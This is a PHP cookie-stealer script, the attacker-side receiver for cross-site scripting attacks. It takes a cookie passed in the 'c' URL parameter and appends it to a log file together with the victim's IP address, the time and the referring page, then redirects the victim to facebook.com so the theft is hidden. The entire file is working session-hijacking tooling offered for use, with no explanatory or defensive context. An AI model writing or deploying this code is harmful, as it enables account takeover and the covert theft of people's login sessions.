<?php
$cookie = $_GET['c'];
$ip = getenv ('REMOTE_ADDR');
$date = date("H:i dS F");
$referer=getenv ('HTTP_REFERER');
$fp = fopen('cookies', 'a');
fwrite($fp, "IP:      " . $ip . "\r\n");
fwrite($fp, "Date:    " .$date. "\r\n");
fwrite($fp, "Referer: " . $referer . "\r\n" );
fwrite($fp, "Cookie:  " . $cookie . "\r\n***************************************************************\r\n");
fclose($fp);
header ("Location: http://www.facebook.com"); /* USE IF WANT TO REDIRECT TO ANOTHER PAGE */
?>
